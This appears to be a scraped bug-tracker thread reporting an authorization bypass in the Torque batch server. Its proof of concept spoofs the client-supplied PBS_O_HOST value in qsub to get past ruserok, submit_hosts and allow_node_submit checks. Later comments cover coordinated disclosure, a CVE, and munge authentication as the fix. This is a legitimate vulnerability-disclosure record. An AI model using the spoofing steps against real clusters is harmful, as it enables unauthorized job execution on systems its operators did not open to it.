						"thetext": "User-Agent:       Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C)\n\nThis Vulnerability was found not by the submitter of the bug but by Bartlomiej Balcerek@pwr.wroc.pl (Bartlomiej.Balcerek@pwr.wroc.pl) \n\nTorque, at least recent version (3.0.1) and GLite versions (e.g.\n2.3.13,2.4.12) are vulnerable to authorization bypass attack.\n\nTorque's server, during authorization relies on data provided\nby \"qsub\" client. Qsub provides submit host name to server (hidden way),\nwhich is used by server to authenticate request.\n\nUsing subverted PBS_O_HOST parameter it is possible to\nomit at least three (of four) authorization mechanisms Torque uses:\n\n1)  RCmd, using ruserok() function,\n2) \"submit_hosts\" server parameter,\n3) \"allow_node_submit\" server parameter\n\nAs for the 4th mechanism: ACL (\"acl_host_enable\" option) it is proof\nagainst such authorization bypass.\n\nThe \"orighost\" is taken from settable on client side variable pbs_o_host:\n\n\"src/lib/Libsite/site_check_u.c\":\n\n   orighost = get_variable(pjob, pbs_o_host);\n\n\nThen three checks are performed to authorize submit host. All\nrefer \"orighost\" variable.\n\n1)\n\"src/lib/Libsite/site_check_u.c\":\n    \n  rc = ruserok(orighost, 0, owner, luser);\n\n   if (rc != 0 && EMsg != NULL)\n        {\n ...\n  snprintf(EMsg, 1024, \"ruserok failed validating %s/%s from %s\",\n                 owner,\n                 luser,\n                 orighost);\n2)\n\"src/lib/Libsite/site_check_u.c\":\n\n for (hostnum = 0;hostnum < submithosts->as_usedptr;hostnum++)\n      {\n      testhost = submithosts->as_string[hostnum];\n\n      if (!strcasecmp(testhost, orighost))\n        {\n        /* job submitted from host found in trusted submit host list,\naccess allowed */\n\n\n3)\n\"src/lib/Libsite/site_check_u.c\":\n\n  if ((HostAllowed == 0) &&\n          (server.sv_attr[SRV_ATR_AllowNodeSubmit].at_flags &\nATR_VFLAG_SET) &&\n          (server.sv_attr[SRV_ATR_AllowNodeSubmit].at_val.at_long     == 1) &&\n          (find_nodebyname(orighost) != NULL))\n        {\n        /* job submitted from compute host, access allowed */\n\n\nProof if concept:\n\n1. Pick the site you want to check against vulnerability, check if its\nport 15001 is open to you,\n2. Check its Torque version ,\n3. Choose a machine, that is not authorized to submit jobs, you must\nhave root access to this machine,\n4. Pick an appropriate  Torque version from\nhttp://www.clusterresources.com/downloads/torque/\nYou can choose v. 2.3.6 to perform check against Torque server <= 2.4.12\n5. Apply the attached patch e.g.:\n\npatch -p1 < torque-2.3.6-customargs.patch\n\n6. Configure and make e.g..:\n\n./configure --with-server-home=/opt/Torque-2.3.6/spool\n--prefix=/opt/Torque-2.3.6 --disable-server --disable-mom\n\nmake\nmake install (from root account)\n\n7. Guess/choose any remote account name,\n\n8. Create an account of such name on your local machine, and\nperform next task using this account,\n\n9. Try to submit a job in regular way e.g.:\n\necho /bin/sleep 100 | /opt/Torque-2.3.6/bin/qsub -q @<site address>\n\nAt the end of the output you should see that your job was rejected:\n\nqsub: Bad UID for job execution MSG=ruserok failed validating\nbartol/bartol from sec.wcss.wroc.pl\n\n10. Check PBS_O_HOST variable on \"Variable_List\" in qsub output.\nIt should be changed to addres of valid \"submit host\". Server name\nitself is good idea there.\n\n11. Submit a job with changed PBS_O_HOST on variable list e.g.:\n\necho /bin/sleep 100 | /opt/Torque-2.3.6/bin/qsub -q @batch.wcss.wroc.pl\n-Z \"Variable_List=PBS_O_HOME=/hom\ne/bartol,PBS_O_LANG=pl_PL.utf8,PBS_O_LOGNAME=bartol,PBS_O_PATH=/usr/lib64/qt-3.3/bin:/usr/NX/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/bartol/bin,PBS_O_MAIL=/var/spool/mail/bartol,PBS_O_SHELL=/bin/bash,PBS_SERVER=sec.wcss.wroc.pl,PBS_O_HOST=batch.wcss.wroc.pl,PBS_O_WORKDIR=/home/bartol\"\n\nThe submission should succeed now.\n\n\n\nReproducible: Always\n\n\n\n\nThis bug has already been reported to the Torque providers and the EGI Software Vulnerability Group (SVG)\n\nThe EGI http://www.egi.eu/ Software Vulnerability group  http://www.egi.eu/policy/groups/Software_Vulnerability_Group_SVG.html runs a process for handling software vulnerabilities reported. While our work is primarily designed to handle vulnerabilities in Grid Middleware, other vulnerabilities found in software used in the EGI infrastructure may also be reported to us and we pass the information on to the software suppliers, as well as considering the risk to the EGI infrastructure."

I believe EPEL tries to follow RHEL-style rules when it comes to updates, so I don't know if adding munge support to those is feasible.\n\nDoes this go away when munge support is enabled?  I.e. there is no need fot the server to obtain this orighost variable from the client as described (munge obsoletes this code perhaps)?\n\nI'm afraid I don't fully understand how munge support makes this not vulnerable.\n\nAny further word from upstream regarding this?  Perhaps in such a way that those installs that are not compiled with munge and/or don't have munge available, can be protected?"

Upstream is now in CC.\n\nMunge it is then.\n\nOh and thanks digger deaper.\n\nSteve."

Ken, do you have plans to correct the problem and make this information public?  This would affect more than just us, regarding people that do not have munge available or having torque built against it.\n\nWe would like to make this bug and the information public at some point, but definitely want to respect your timeframe and solutions.  I also suspect that Linda would appreciate knowing when this would be public as well.\n\nWe can assist with assigning a CVE name to this flaw, and if we can help in other ways to facilitate this (perhaps advising other vendors when a suitable patch/solution is prepared), we would like to.\n\nPlease advise."

A munge package[2] is of course available within EPEL5.\r\n\r\n * [1] http://code.google.com/p/munge/\r\n * [2] https://admin.fedoraproject.org/community/?package=munge#package_maintenance\r\n\r\nTo enable munge on your torque cluster:\r\n\r\n * Install the munge package on your pbs_server and submission hosts in your cluster.\r\n * On one host generate a key with */usr/sbin/create-munge-key*\r\n * Copy the key, /etc/munge/munge.key to your pbs_server and submission hosts on your cluster.\r\n * Start the munge daemon on these nodes.. **service munge start && chkconfig munge on**\r\n\r\n**Warning: New internal format for Job arrays:**\r\n\r\nTORQUE 2.5 uses a new format for job arrays. It is not backwards\r\ncompatible with job arrays from version 2.3 or 2.4. Therefore, it is imperative that the system be drained of any job arrays BEFORE upgrading. Upgrading with job arrays queued or running may cause data loss, crashes, etc, and is not supported.\r\n\r\nThis update  from 2.3.10 includes numerous bugfixes and enhancements. Please read the torque ChangeLog.The significant changes that require action prior to upgrade are however detailed above.\r\n\r\n\r\n",
